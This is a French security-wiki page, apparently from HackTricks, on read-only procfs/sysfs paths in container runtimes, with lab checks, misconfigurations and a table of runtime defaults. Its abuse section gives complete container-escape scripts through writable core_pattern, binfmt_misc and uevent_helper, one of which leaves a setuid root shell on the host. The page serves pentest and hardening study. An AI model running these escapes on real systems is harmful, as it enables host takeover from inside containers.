# Chemins système en lecture seule

{{#include ../../../../banners/hacktricks-training.md}}

Les chemins système en lecture seule sont une protection distincte des chemins masqués. Au lieu de masquer complètement un chemin, le runtime l'expose mais le monte en lecture seule. C'est courant pour certains emplacements procfs et sysfs où l'accès en lecture peut être acceptable ou nécessaire opérationnellement, alors que les écritures seraient trop dangereuses.

Le but est simple : de nombreuses interfaces du kernel deviennent beaucoup plus dangereuses lorsqu'elles sont modifiables. Un montage en lecture seule n'élimine pas toute valeur de reconnaissance, mais empêche une charge de travail compromise de modifier les fichiers exposés au kernel via ce chemin.

## Fonctionnement

Les runtimes marquent fréquemment des parties de la vue proc/sys comme en lecture seule. Selon le runtime et l'hôte, cela peut inclure des chemins tels que :

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La liste réelle varie, mais le modèle est le même : autoriser la visibilité là où c'est nécessaire, refuser la modification par défaut.

## Laboratoire

Inspectez la liste de chemins en lecture seule déclarée par Docker :
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspectez la vue montée proc/sys depuis l'intérieur du container :
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impact sur la sécurité

Les chemins système en lecture seule réduisent une grande classe d'abus affectant l'hôte. Même lorsqu'un attaquant peut inspecter procfs ou sysfs, l'impossibilité d'y écrire supprime de nombreuses voies de modification directe impliquant les paramètres du noyau, les gestionnaires de plantage, les aides au chargement des modules ou d'autres interfaces de contrôle. L'exposition n'est pas éliminée, mais la transition de la divulgation d'informations à l'influence sur l'hôte devient plus difficile.

## Mauvaises configurations

Les principales erreurs consistent à démasquer ou remonter des chemins sensibles en lecture-écriture, exposer directement le contenu proc/sys de l'hôte avec des bind mounts en écriture, ou utiliser des modes privilégiés qui contournent effectivement les valeurs par défaut d'exécution plus sûres. Dans Kubernetes, `procMount: Unmasked` et les workloads privilégiés vont souvent de pair avec une protection proc plus faible. Une autre erreur opérationnelle courante est de supposer que parce que le runtime monte habituellement ces chemins en lecture seule, toutes les workloads héritent encore de ce comportement par défaut.

## Abus

Si la protection est faible, commencez par rechercher des entrées proc/sys modifiables :
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Lorsque des entrées modifiables sont présentes, les pistes de suivi à forte valeur incluent :
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Ce que ces commandes peuvent révéler :

- Les entrées modifiables sous `/proc/sys` signifient souvent que le conteneur peut modifier le comportement du noyau de l'hôte plutôt que simplement l'inspecter.
- `core_pattern` est particulièrement important car une valeur côté hôte modifiable peut être transformée en un chemin d'exécution de code sur l'hôte en provoquant le crash d'un processus après avoir configuré un pipe handler.
- `modprobe` révèle le helper utilisé par le noyau pour les flux liés au chargement de modules ; c'est une cible classique de grande valeur lorsqu'il est modifiable.
- `binfmt_misc` indique si l'enregistrement d'interpréteur personnalisé est possible. Si l'enregistrement est modifiable, cela peut devenir une execution primitive au lieu d'être seulement une information leak.
- `panic_on_oom` contrôle une décision du noyau à l'échelle de l'hôte et peut donc transformer une épuisement des ressources en déni de service sur l'hôte.
- `uevent_helper` est un des exemples les plus clairs d'un chemin helper sysfs modifiable produisant une exécution dans le contexte de l'hôte.

Les découvertes intéressantes incluent des réglages proc exposés côté hôte ou des entrées sysfs modifiables qui auraient normalement dû être en lecture seule. À ce stade, la charge de travail est passée d'une vue contrainte du conteneur vers une influence significative sur le noyau.

### Exemple complet : `core_pattern` Host Escape

Si `/proc/sys/kernel/core_pattern` est modifiable depuis l'intérieur du conteneur et qu'il pointe vers la vue noyau de l'hôte, il peut être abusé pour exécuter un payload après un crash :
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si le chemin atteint réellement le noyau de l'hôte, le payload s'exécute sur celui-ci et laisse derrière lui une setuid shell.

### Exemple complet : enregistrement `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture, l'enregistrement d'un interpréteur personnalisé peut entraîner l'exécution de code lorsque le fichier correspondant est exécuté :
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Sur un binfmt_misc accessible depuis l'hôte et en écriture, le résultat est l'exécution de code dans le chemin d'interpréteur déclenché par le noyau.

### Exemple complet : `uevent_helper`

Si `/sys/kernel/uevent_helper` est accessible en écriture, le noyau peut invoquer un helper côté hôte lorsqu'un événement correspondant est déclenché :
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La raison pour laquelle cela est si dangereux est que le chemin du helper est résolu du point de vue du système de fichiers hôte plutôt que depuis un contexte sécurisé limité au container.

## Checks

Ces vérifications déterminent si l'exposition de procfs/sysfs est en lecture seule comme prévu et si la workload peut encore modifier des interfaces kernel sensibles.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Ce qui est intéressant ici :

- Une charge de travail durcie normale ne devrait exposer que très peu d'entrées proc/sys inscriptibles.
- Les chemins `/proc/sys` inscriptibles sont souvent plus importants que l'accès en lecture ordinaire.
- Si le runtime indique qu'un chemin est en lecture seule mais qu'il est inscriptible en pratique, vérifiez attentivement la propagation des montages, les bind mounts et les paramètres de privilèges.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Docker définit une liste par défaut de chemins en lecture seule pour les entrées proc sensibles | exposer les montages /proc/sys de l'hôte, `--privileged` |
| Podman | Activé par défaut | Podman applique des chemins en lecture seule par défaut sauf s'ils sont explicitement relâchés | `--security-opt unmask=ALL`, montages larges de l'hôte, `--privileged` |
| Kubernetes | Hérite des valeurs par défaut du runtime | Utilise le modèle de chemins en lecture seule du runtime sous-jacent sauf s'il est affaibli par les paramètres du Pod ou par des montages d'hôte | `procMount: Unmasked`, workloads privilégiés, montages /proc/sys inscriptibles de l'hôte |
| containerd / CRI-O under Kubernetes | Valeur par défaut du runtime | S'appuie généralement sur les valeurs par défaut OCI/runtime | idem que la ligne Kubernetes ; des modifications directes de la config runtime peuvent affaiblir le comportement |

L'essentiel est que les chemins système en lecture seule sont généralement présents par défaut au runtime, mais ils sont faciles à contourner avec des modes privilégiés ou des bind mounts d'hôte.
{{#include ../../../../banners/hacktricks-training.md}}
